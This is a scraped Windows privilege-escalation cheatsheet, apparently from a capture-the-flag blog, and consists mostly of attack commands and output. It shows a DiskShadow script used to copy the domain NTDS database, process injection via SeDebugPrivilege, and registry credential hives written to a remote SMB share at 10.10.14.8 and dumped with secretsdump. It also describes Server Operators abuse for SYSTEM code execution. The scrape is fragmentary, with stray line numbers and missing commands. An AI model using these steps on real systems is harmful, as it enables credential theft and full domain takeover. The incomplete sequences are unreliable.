---
title: "windows privesc cheatsheet serioton"
source_url: https://seriotonctf.github.io/Windows-Privesc/
fetched_at: 2026-09-20T07:24:55Z
license: unspecified
category: windows
---

Privilege Name Description State ============================= ============================== ======= ... SeBackupPrivilege Back up files and directories Enabled ...

Disk Shadow method

pwn.txt file content

1 2 3 4

set context persistent nowriters add volume c: alias pwn create expose %pwn% z:

> diskshadow /s pwn.txt Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: BABYDC, 8/9/2024 10:57:34 PM

-> set context persistent nowriters -> add volume c: alias pwn -> create Alias pwn for shadow ID {041d93f3-797d-4f91-a270-5c1fb66092e6} set as environment variable. Alias VSS_SHADOW_SET for shadow set ID {7df9215a-2efb-4a28-befe-cbaf15deba8c} set as environment variable.

Querying all shadow copies with the shadow copy set ID {7df9215a-2efb-4a28-befe-cbaf15deba8c}

* Shadow copy ID = {041d93f3-797d-4f91-a270-5c1fb66092e6} %pwn% - Shadow copy set: {7df9215a-2efb-4a28-befe-cbaf15deba8c} %VSS_SHADOW_SET% - Original count of shadow copies = 1 - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\] - Creation time: 8/9/2024 10:57:36 PM - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 - Originating machine: BabyDC.baby.vl - Service machine: BabyDC.baby.vl - Not exposed - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5} - Attributes: No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1 -> expose %pwn% z: -> %pwn% = {041d93f3-797d-4f91-a270-5c1fb66092e6} The shadow copy was successfully exposed as z:\. ->

------------------------------------------------------------------------------- ROBOCOPY :: Robust File Copy for Windows -------------------------------------------------------------------------------

Started : Friday, August 9, 2024 10:57:58 PM Source : z:\windows\ntds\ Dest : C:\temp\

Privilege Name Description State ============================= ========================================= ======== ... SeImpersonatePrivilege Impersonate a client after authentication Enabled ...

Privilege Name Description State ============================= ============================== ======== SeDebugPrivilege Debug programs Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

> .\adopt.exe vm3dservice.exe C:\windows\tasks\update.exe [>] Target pid is 2508 [>] ShellExecuteExW is at 00007FFB7BF974A0 [>] Thread running, done! (Handle: 100)

SeTcbPrivilege

1 2 3 4 5 6 7 8 9 10

> whoami /priv

PRIVILEGES INFORMATION ----------------------

Privilege Name Description State ============================= =================================== ======= ... SeTcbPrivilege Act as part of the operating system Enabled ...

[*] Saved HKLM\SAM to \\10.10.14.8\share\SAM.save [*] Saved HKLM\SYSTEM to \\10.10.14.8\share\SYSTEM.save [*] Saved HKLM\SECURITY to \\10.10.14.8\share\SECURITY.save

$ secretsdump.py local -sam SAM.save -system SYSTEM.save -security SECURITY.save

Or

1 2 3 4

> reg save hklm\sam sam > download sam > reg save hklm\system system > download system

Its members can sign-in to a server, start and stop services, access domain controllers, perform maintenance tasks (such as backup and restore), and they have the ability to change binaries that are installed on the domain controllers.

1 2 3 4 5

> net user svc-printer ... Local Group Memberships *Print Operators *Remote Management Use *Server Operators Global Group memberships *Domain Users

When we are member of this group we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. We can re-configure the service and we have the required privileges to restart it.
